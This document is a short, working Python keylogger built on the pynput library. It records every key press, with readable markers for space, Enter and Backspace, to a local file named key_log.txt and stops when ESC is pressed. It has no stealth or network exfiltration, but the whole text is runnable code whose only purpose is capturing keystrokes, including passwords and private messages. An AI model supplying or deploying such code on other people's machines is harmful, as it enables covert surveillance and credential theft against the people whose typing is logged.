from pynput.keyboard import Key, Listener

# Specify the log file path
log_file = "key_log.txt"

# Function to log each key press
def log_key(key):
    key = str(key).replace("'", "")  # Remove quotes around characters
    with open(log_file, "a") as file:
        if key == "Key.space":  # Add space for readability
            file.write(" ")
        elif key == "Key.enter":  # Add newline for Enter key
            file.write("\n")
        elif key == "Key.backspace":  # Represent backspace with [BACKSPACE]
            file.write("[BACKSPACE]")
        else:
            file.write(key)

# Function to stop listener (optional)
def stop_keylogger(key):
    if key == Key.esc:  # Stop when ESC is pressed
        return False

# Setup listener for keypresses
with Listener(on_press=log_key, on_release=stop_keylogger) as listener:
    listener.join()
